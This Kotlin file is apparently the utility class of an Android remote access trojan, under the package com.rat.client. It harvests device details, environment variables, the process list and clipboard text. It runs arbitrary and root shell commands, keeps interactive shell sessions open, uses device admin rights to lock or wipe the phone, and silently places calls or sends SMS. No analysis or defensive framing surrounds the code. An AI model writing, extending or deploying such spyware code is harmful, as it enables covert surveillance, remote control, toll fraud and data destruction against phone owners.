package com.rat.client.util

import android.annotation.SuppressLint
import android.app.Activity
import android.app.ActivityManager
import android.app.admin.DevicePolicyManager
import android.content.ClipData
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.content.pm.ResolveInfo
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.PixelFormat
import android.graphics.drawable.Drawable
import android.net.Uri
import android.os.Build
import android.os.Debug
import android.os.Environment
import android.os.Process
import android.os.StatFs
import android.provider.Settings
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.Display
import android.view.View
import android.view.WindowManager
import java.io.BufferedReader
import java.io.File
import java.io.FileOutputStream
import java.io.InputStreamReader
import java.lang.reflect.Method
import java.util.*
import java.util.concurrent.TimeUnit

class SystemUtils private constructor() {

    companion object {
        @Suppress("UNUSED_PARAMETER")
        private const val TAG = "SystemUtils"
        private var context: Context? = null
        private val shellSessions = mutableMapOf<String, ShellSession>()

        
        fun init(appContext: Context) {
            context = appContext.applicationContext
        }

        private val ctx: Context
            get() = context ?: throw IllegalStateException("SystemUtils not initialized")

        // ===== System Info =====

        
        fun getSystemInfo(context: Context): Map<String, Any> {
            val info = mutableMapOf<String, Any>()

            // CPU Info
            info["cpu_abi"] = Build.SUPPORTED_ABIS.joinToString(",")
            info["cpu_cores"] = Runtime.getRuntime().availableProcessors()
            info["cpu_arch"] = System.getProperty("os.arch")
            info["cpu_freq"] = getCpuFrequencies()

            // Memory
            val memInfo = getMemoryInfo()
            info["memory"] = memInfo

            // Storage
            val storageInfo = getStorageInfo()
            info["storage"] = storageInfo

            // Display
            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val display = windowManager.defaultDisplay
            val metrics = DisplayMetrics()
            display.getRealMetrics(metrics)
            info["display"] = mapOf(
                "width" to metrics.widthPixels,
                "height" to metrics.heightPixels,
                "density" to metrics.density,
                "density_dpi" to metrics.densityDpi,
                "rotation" to display.rotation,
                "refresh_rate" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) display.refreshRate else 60f
            )

            // OS Properties
            info["os"] = mapOf(
                "version" to Build.VERSION.RELEASE,
                "sdk" to Build.VERSION.SDK_INT,
                "incremental" to Build.VERSION.INCREMENTAL,
                "security_patch" to Build.VERSION.SECURITY_PATCH,
                "codename" to Build.VERSION.CODENAME,
                "preview_sdk" to Build.VERSION.PREVIEW_SDK_INT
            )

            // Build Properties
            info["build"] = mapOf(
                "id" to Build.ID,
                "display" to Build.DISPLAY,
                "fingerprint" to Build.FINGERPRINT,
                "tags" to Build.TAGS,
                "type" to Build.TYPE,
                "user" to Build.USER,
                "host" to Build.HOST,
                "time" to Build.TIME,
                "product" to Build.PRODUCT,
                "device" to Build.DEVICE,
                "board" to Build.BOARD,
                "manufacturer" to Build.MANUFACTURER,
                "brand" to Build.BRAND,
                "model" to Build.MODEL,
                "hardware" to Build.HARDWARE,
                "bootloader" to Build.BOOTLOADER,
                "radio" to getRadioVersion()
            )

            // Process Info
            info["process"] = mapOf(
                "pid" to Process.myPid(),
                "uid" to Process.myUid(),
                "name" to getProcessName(),
                "thread_count" to Thread.activeCount()
            )

            // Running Processes
            info["top_processes"] = getTopProcesses(context, 20)

            // Environment
            info["env"] = System.getenv().toMap()

            // Java System Properties (filtered)
            info["java_props"] = System.getProperties().map { (k, v) -> k to v.toString() }
                .filter { (k, _) -> !k.contains("password") && !k.contains("key") && !k.contains("secret") }
                .toMap()

            return info
        }

        private fun getCpuFrequencies(): List<Long> {
            val freqs = mutableListOf<Long>()
            try {
                val cpuDir = File("/sys/devices/system/cpu")
                val cpuDirs = cpuDir.listFiles { _, name -> name.matches("cpu[0-9]+".toRegex()) } ?: emptyArray()
                for (cpu in cpuDirs) {
                    val freqFile = File(cpu, "cpufreq/scaling_cur_freq")
                    if (freqFile.exists()) {
                        freqs.add(freqFile.readText().trim().toLong())
                    }
                }
            } catch (e: Exception) {
                // Ignore
            }
            return freqs
        }

        private fun getMemoryInfo(): Map<String, Any> {
            val memInfo = Debug.MemoryInfo()
            Debug.getMemoryInfo(memInfo)
            val runtime = Runtime.getRuntime()
            return mapOf(
                "total_ram" to getTotalRam(),
                "available_ram" to getAvailableRam(),
                "app_total" to runtime.totalMemory(),
                "app_max" to runtime.maxMemory(),
                "app_free" to runtime.freeMemory(),
                "dalvik_total" to memInfo.dalvikPss,
                "dalvik_private" to memInfo.dalvikPrivateDirty,
                "native_total" to memInfo.nativePss,
                "native_private" to memInfo.nativePrivateDirty,
                "other_total" to memInfo.otherPss,
                "other_private" to memInfo.otherPrivateDirty
            )
        }

        private fun getTotalRam(): Long {
            return try {
                val memInfo = File("/proc/meminfo").readText()
                val match = "MemTotal:\\s+(\\d+)".toRegex().find(memInfo)
                match?.groupValues?.get(1)?.toLongOrNull()?.times(1024) ?: 0
            } catch (e: Exception) {
                0
            }
        }

        private fun getAvailableRam(): Long {
            return try {
                val memInfo = File("/proc/meminfo").readText()
                val match = "MemAvailable:\\s+(\\d+)".toRegex().find(memInfo)
                match?.groupValues?.get(1)?.toLongOrNull()?.times(1024) ?: 0
            } catch (e: Exception) {
                0
            }
        }

        private fun getStorageInfo(): Map<String, Any> {
            val paths = mapOf(
                "internal" to Environment.getDataDirectory(),
                "external" to Environment.getExternalStorageDirectory(),
                "system" to Environment.getRootDirectory()
            )

            return paths.mapValues { (name, path) ->
                val stat = StatFs(path.absolutePath)
                val blockSize = stat.blockSizeLong
                val totalBlocks = stat.blockCountLong
                val availableBlocks = stat.availableBlocksLong
                name to mapOf(
                    "path" to path.absolutePath,
                    "total" to totalBlocks * blockSize,
                    "available" to availableBlocks * blockSize,
                    "used" to (totalBlocks - availableBlocks) * blockSize,
                    "free_percent" to if (totalBlocks > 0) (availableBlocks * 100 / totalBlocks) else 0L
                )
            }
        }

        private fun getProcessName(): String {
            return try {
                val cmd = File("/proc/${Process.myPid()}/cmdline").readText()
                if (cmd.isNotEmpty()) cmd else "unknown"
            } catch (e: Exception) {
                "unknown"
            }
        }

        private fun getTopProcesses(context: Context, limit: Int): List<Map<String, Any>> {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val processes = am.getRunningAppProcesses() ?: emptyList()
            return processes.take(limit).map { proc ->
                mapOf(
                    "pid" to proc.pid,
                    "name" to proc.processName,
                    "uid" to proc.uid,
                    "importance" to proc.importance,
                    "importance_reason" to proc.importanceReasonCode,
                    "lru" to proc.lru
                )
            }
        }

        private fun getRadioVersion(): String {
            return try {
                Runtime.getRuntime().exec("getprop gsm.version.baseband").inputStream.bufferedReader().readLine() ?: "Unknown"
            } catch (e: Exception) {
                "Unknown"
            }
        }

        // ===== Shell Execution =====

        
        fun executeShellCommand(command: String, timeoutMs: Long = 30000): Map<String, Any> {
            return try {
                val process = Runtime.getRuntime().exec(command)
                val output = StringBuilder()
                val error = StringBuilder()

                val outputThread = Thread {
                    BufferedReader(InputStreamReader(process.inputStream)).use { reader ->
                        reader.forEachLine { output.append(it).append('\n') }
                    }
                }

                val errorThread = Thread {
                    BufferedReader(InputStreamReader(process.errorStream)).use { reader ->
                        reader.forEachLine { error.append(it).append('\n') }
                    }
                }

                outputThread.start()
                errorThread.start()

                val finished = process.waitFor(timeoutMs, TimeUnit.MILLISECONDS)
                if (!finished) {
                    process.destroyForcibly()
                }

                outputThread.join(1000)
                errorThread.join(1000)

                mapOf(
                    "exit_code" to process.exitValue(),
                    "stdout" to output.toString().trim(),
                    "stderr" to error.toString().trim(),
                    "timed_out" to !finished
                )
            } catch (e: Exception) {
                mapOf("error" to e.message ?: "Execution failed")
            }
        }

        
        fun executeInteractiveShell(sessionId: String, command: String): Map<String, Any> {
            var session = shellSessions[sessionId]
            if (session == null) {
                session = ShellSession()
                shellSessions[sessionId] = session
            }
            return session.execute(command)
        }

        
        fun closeShellSession(sessionId: String): Boolean {
            return shellSessions.remove(sessionId)?.close() ?: false
        }

        private class ShellSession {
            private var process: Process? = null
            private var outputStream: java.io.OutputStream? = null
            private var inputStream: java.io.InputStream? = null
            private var errorStream: java.io.InputStream? = null
            private val outputBuffer = StringBuilder()
            private val errorBuffer = StringBuilder()

            init {
                try {
                    process = Runtime.getRuntime().exec("/system/bin/sh")
                    outputStream = process!!.outputStream
                    inputStream = process!!.inputStream
                    errorStream = process!!.errorStream

                    // Start reading threads
                    Thread {
                        BufferedReader(InputStreamReader(inputStream!!)).use { reader ->
                            reader.forEachLine { outputBuffer.append(it).append('\n') }
                        }
                    }.start()

                    Thread {
                        BufferedReader(InputStreamReader(errorStream!!)).use { reader ->
                            reader.forEachLine { errorBuffer.append(it).append('\n') }
                        }
                    }.start()
                } catch (e: Exception) {
                    // Handle error
                }
            }

            fun execute(command: String): Map<String, Any> {
                return try {
                    outputStream?.write("$command\n".toByteArray())
                    outputStream?.flush()

                    // Wait a bit for output
                    Thread.sleep(500)

                    val stdout = outputBuffer.toString()
                    val stderr = errorBuffer.toString()
                    outputBuffer.setLength(0)
                    errorBuffer.setLength(0)

                    mapOf("stdout" to stdout, "stderr" to stderr)
                } catch (e: Exception) {
                    mapOf("error" to e.message ?: "Execution failed")
                }
            }

            fun close(): Boolean {
                try {
                    outputStream?.write("exit\n".toByteArray())
                    outputStream?.flush()
                    process?.waitFor(2, TimeUnit.SECONDS)
                    process?.destroyForcibly()
                    outputStream?.close()
                    inputStream?.close()
                    errorStream?.close()
                    return true
                } catch (e: Exception) {
                    return false
                }
            }
        }

        // ===== Root Commands =====

        
        fun executeRootCommand(command: String): Map<String, Any> {
            return try {
                val process = Runtime.getRuntime().exec("su")
                val output = StringBuilder()
                val error = StringBuilder()

                val os = process.outputStream
                os.write("$command\n".toByteArray())
                os.write("exit\n".toByteArray())
                os.flush()
                os.close()

                BufferedReader(InputStreamReader(process.inputStream)).use { reader ->
                    reader.forEachLine { output.append(it).append('\n') }
                }
                BufferedReader(InputStreamReader(process.errorStream)).use { reader ->
                    reader.forEachLine { error.append(it).append('\n') }
                }

                process.waitFor(10, TimeUnit.SECONDS)

                mapOf(
                    "exit_code" to process.exitValue(),
                    "stdout" to output.toString().trim(),
                    "stderr" to error.toString().trim()
                )
            } catch (e: Exception) {
                mapOf("error" to e.message ?: "Root execution failed")
            }
        }

        
        fun isRootAvailable(): Boolean {
            return executeRootCommand("id").let { (it["exit_code"] as? Int ?: -1) == 0 }
        }

        // ===== Clipboard =====

        
        fun getClipboardText(context: Context): Map<String, Any> {
            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            if (clipboard.hasPrimaryClip()) {
                val clip = clipboard.primaryClip
                if (clip != null && clip.itemCount > 0) {
                    val text = clip.getItemAt(0).text.toString()
                    return mapOf("text" to text, "has_text" to true)
                }
            }
            return mapOf("text" to "", "has_text" to false)
        }

        
        fun setClipboardText(context: Context, text: String): Boolean {
            try {
                val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                val clip = ClipData.newPlainText("clipboard", text)
                clipboard.primaryClip = clip
                return true
            } catch (e: Exception) {
                Log.e(TAG, "Set clipboard failed: ${e.message}")
                return false
            }
        }

        // ===== Notifications =====

        
        fun sendNotification(context: Context, title: String, text: String): Boolean {
            try {
                val intent = Intent(context, MainActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
                }
                val pendingIntent = android.app.PendingIntent.getActivity(
                    context, 0, intent, android.app.PendingIntent.FLAG_IMMUTABLE
                )

                val channelId = "rat_notifications"
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    val channel = android.app.NotificationChannel(
                        channelId,
                        "RAT Notifications",
                        android.app.NotificationManager.IMPORTANCE_HIGH
                    )
                    val manager = context.getSystemService(android.app.NotificationManager::class.java)
                    manager.createNotificationChannel(channel)
                }

                val notification = android.app.NotificationCompat.Builder(context, channelId)
                    .setContentTitle(title)
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .setContentIntent(pendingIntent)
                    .setAutoCancel(true)
                    .setPriority(android.app.NotificationCompat.PRIORITY_HIGH)
                    .build()

                val manager = context.getSystemService(android.app.NotificationManager::class.java)
                manager.notify((System.currentTimeMillis() % Int.MAX_VALUE).toInt(), notification)
                return true
            } catch (e: Exception) {
                Log.e(TAG, "Notification failed: ${e.message}")
                return false
            }
        }

        // ===== Screenshot =====

        
        fun takeScreenshot(view: View): Bitmap? {
            return try {
                val bitmap = Bitmap.createBitmap(view.width, view.height, Bitmap.Config.ARGB_8888)
                val canvas = Canvas(bitmap)
                view.draw(canvas)
                bitmap
            } catch (e: Exception) {
                Log.e(TAG, "Screenshot failed: ${e.message}")
                null
            }
        }

        
        fun bitmapToBase64(bitmap: Bitmap): String {
            val baos = java.io.ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos)
            return Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT)
        }

        // ===== Package Management =====

        
        fun getPackageInfo(context: Context, packageName: String): Map<String, Any>? {
            return try {
                val pm = context.packageManager
                val pkgInfo = pm.getPackageInfo(packageName, PackageManager.GET_META_DATA or PackageManager.GET_SIGNATURES or PackageManager.GET_PERMISSIONS)
                val appInfo = pm.getApplicationInfo(packageName, 0)

                mapOf(
                    "package" to packageName,
                    "name" to pm.getApplicationLabel(appInfo).toString(),
                    "version_name" to pkgInfo.versionName,
                    "version_code" to pkgInfo.versionCode,
                    "install_time" to pkgInfo.firstInstallTime,
                    "update_time" to pkgInfo.lastUpdateTime,
                    "data_dir" to appInfo.dataDir,
                    "source_dir" to appInfo.sourceDir,
                    "native_lib_dir" to appInfo.nativeLibraryDir,
                    "uid" to appInfo.uid,
                    "flags" to appInfo.flags,
                    "permissions" to pkgInfo.requestedPermissions?.toList() ?: emptyList(),
                    "signatures" to pkgInfo.signatures.map { it.toCharsString() }
                )
            } catch (e: Exception) {
                null
            }
        }

        
        fun getIntentActivities(context: Context, action: String): List<Map<String, Any>> {
            val pm = context.packageManager
            val intent = Intent(action)
            val activities = pm.queryIntentActivities(intent, PackageManager.MATCH_DEFAULT_ONLY)
            return activities.map { info ->
                mapOf(
                    "package" to info.activityInfo.packageName,
                    "name" to info.activityInfo.name,
                    "label" to info.loadLabel(pm).toString(),
                    "icon" to drawableToBase64(info.loadIcon(pm))
                )
            }
        }

        private fun drawableToBase64(drawable: Drawable): String {
            val config = if (drawable.opacity != PixelFormat.OPAQUE) Bitmap.Config.ARGB_8888 else Bitmap.Config.RGB_565
            val bitmap = Bitmap.createBitmap(
                drawable.intrinsicWidth,
                drawable.intrinsicHeight,
                config
            )
            val canvas = Canvas(bitmap)
            drawable.setBounds(0, 0, canvas.width, canvas.height)
            drawable.draw(canvas)
            return bitmapToBase64(bitmap)
        }

        // ===== Device Admin =====

        
        fun isDeviceAdminActive(context: Context): Boolean {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, com.rat.client.receiver.DeviceAdminReceiverImpl::class.java)
            return dpm.isAdminActive(adminComponent)
        }

        
        fun lockDevice(context: Context): Boolean {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, com.rat.client.receiver.DeviceAdminReceiverImpl::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.lockNow()
                return true
            }
            return false
        }

        
        fun wipeData(context: Context): Boolean {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, com.rat.client.receiver.DeviceAdminReceiverImpl::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.wipeData(adminComponent, 0)
                return true
            }
            return false
        }

        // ===== Reboot/Shutdown =====

        
        fun reboot(context: Context): Boolean {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, com.rat.client.receiver.DeviceAdminReceiverImpl::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.reboot(adminComponent)
                return true
            }
            // Fallback for root
            return executeRootCommand("reboot")["exit_code"] == 0
        }

        
        fun shutdown(context: Context): Boolean {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, com.rat.client.receiver.DeviceAdminReceiverImpl::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.shutdown(adminComponent)
                return true
            }
            return executeRootCommand("reboot -p")["exit_code"] == 0
        }

        // ===== Intent Helpers =====

        
        fun openUrl(context: Context, url: String): Boolean {
            try {
                val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                context.startActivity(intent)
                return true
            } catch (e: Exception) {
                Log.e(TAG, "Open URL failed: ${e.message}")
                return false
            }
        }

        
        fun makeCall(context: Context, number: String): Boolean {
            try {
                val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$number"))
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                context.startActivity(intent)
                return true
            } catch (e: Exception) {
                Log.e(TAG, "Make call failed: ${e.message}")
                return false
            }
        }

        
        fun sendSms(context: Context, number: String, text: String): Boolean {
            try {
                val smsManager = android.telephony.SmsManager.getDefault()
                smsManager.sendTextMessage(number, null, text, null, null)
                return true
            } catch (e: Exception) {
                Log.e(TAG, "Send SMS failed: ${e.message}")
                return false
            }
        }
    }
}